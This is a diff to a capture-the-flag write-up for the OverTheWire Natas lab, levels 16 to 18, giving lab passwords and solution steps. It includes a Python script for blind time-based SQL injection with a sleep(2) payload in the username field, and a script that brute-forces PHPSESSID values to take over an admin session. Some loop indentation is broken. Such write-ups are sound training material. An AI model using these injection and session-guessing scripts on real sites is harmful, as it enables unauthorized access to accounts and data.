@@ -500,11 +500,13 @@
 
   <img width="521" height="680" alt="image" src="https://github.com/user-attachments/assets/6d58a763-85e4-48d6-b157-a2a66e022ba8" />
 
+
+
 - ## Level-16
 - Username : natas16
 - Password : hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 - Domain : http://natas16.natas.labs.overthewire.org
-- ## Explanation
+- ## Explanation :
   
 - Step 1: Go to Firefox Browser, Then Connect to natas16.natas.labs.overthewire.org, Then login with username and password
 - Step 2: Then click view source code
@@ -561,7 +563,171 @@
 - Step 6: It is slow process, That's why we need to have more patience to get the password for level-17
 
 <img width="690" height="765" alt="image" src="https://github.com/user-attachments/assets/d073fa0e-3711-4a42-950f-016dc782b53b" />
+
+
+- ## Level 17
+- Username : natas17
+- Password : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+- Domain : http://natas17.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas17.natas.labs.overthewire.org, Then login with username and password
+- Step 2: Lets check the natas17 existency or not
+  
+ <img width="943" height="393" alt="image" src="https://github.com/user-attachments/assets/d2488f20-6fe2-46aa-9cd7-33f4cb5fdaf8" />
+
+- Step 3: We can't see the existency of natas17
+
+  <img width="942" height="318" alt="image" src="https://github.com/user-attachments/assets/a15a05ea-4c3d-4aee-bf3f-aad863acb523" />
+
+- Step 4: We can not move forward with simple blind sql injection. Because it is not showing the exixtency of natas17
+
+- Step 5: Then we will see the source code
+
+- Step 6: Then we will use Blind time based sql injection to specific amount of time to get password, By using of Bruteforce attack.
+
+- Step 7: Then write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+-     import requests
+      import re
+      from time import *
+
+      characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+      username = 'natas17'
+      password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
+
+      url = 'http://natas17.natas.labs.overthewire.org'
  
+      session = requests.Session()
+
+      current_password = list()
+
+      while True:
+      for character in characters:
+        print("Trying with: " + "".join(current_password) + character)
+
+        startTime = time()
+
+        response = session.post(
+            url,
+            data={
+                "username": 'natas18" and password like binary "' +
+                "".join(current_password) + character + '%" and sleep(2) #'
+            },
+            auth=(username, password)
+        )
+
+        endTime = time()
+
+        if endTime - startTime >= 2:
+            current_password.append(character)
+            break
+
+      if len(current_password) == 32:
+        break
+
+  - Step 8: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the password for level-18
+
+  <img width="371" height="447" alt="image" src="https://github.com/user-attachments/assets/8ba360e6-7c61-446d-a1dd-df318e6c0a26" />
+
+ - Step 9: Finally it will get the password for level-18
+
+
+
+- ## Level-18
+- Username : natas18
+- Password : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+- Domain : http://natas18.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas18.natas.labs.overthewire.org, Then login with username and password
+  
+<img width="948" height="507" alt="image" src="https://github.com/user-attachments/assets/3b6387b6-d5b0-42c6-b64a-cdd83524f2c9" />
+
+- Step 2: Lets view the source code
+
+  <img width="1010" height="683" alt="image" src="https://github.com/user-attachments/assets/71d33d9a-ce79-4489-9ca5-2fa79c5b3203" />
+
+- Step 3: After saw the max id is 640, Then we will use Bruteforce attack
+
+- Step 4: Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+-     import requests
+
+      base_url = 'http://natas18.natas.labs.overthewire.org'
+      auth_username = 'natas18'
+      auth_password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
+
+      for i in range(640):
+      headers = {
+        "Cookie": "PHPSESSID={0}".format(i)
+      }
+
+      payload = {
+        "username": "any",
+        "password": "any"
+      }
+
+      r = requests.post(
+        base_url,
+        auth=(auth_username, auth_password),
+        headers=headers,
+        data=payload
+      )
+
+      if "You are logged in as a regular user" in r.text:
+        print("PHPSESSID={0} : Failed".format(i))
+      else:
+        print("PHPSESSID={0} : Success".format(i))
+        print(r.text)
+        break
+
+      print("Test completed")
+
+  - Step 5: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the PHPSESSID
+ 
+    <img width="381" height="597" alt="image" src="https://github.com/user-attachments/assets/92b1110b-7b85-4399-9637-07bfd49270e5" />
+
+    <img width="1192" height="533" alt="image" src="https://github.com/user-attachments/assets/5f35a27c-4717-4448-8a28-560423350022" />
+
+  - Step 6: Then go to intercept tab, Then change that PHPSESSID: what you get from the attack, Then click on forward,   (type - "PHPSESID=119")
+ 
+    <img width="1671" height="762" alt="image" src="https://github.com/user-attachments/assets/7d2e66cb-ef2b-487e-919f-0e3b3849fffd" />
+
+  - Step 7: Then you will get the password for Natas19
+
+    <img width="1455" height="396" alt="image" src="https://github.com/user-attachments/assets/b42ea7af-d938-4900-b376-aaa7aeadb5f2" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
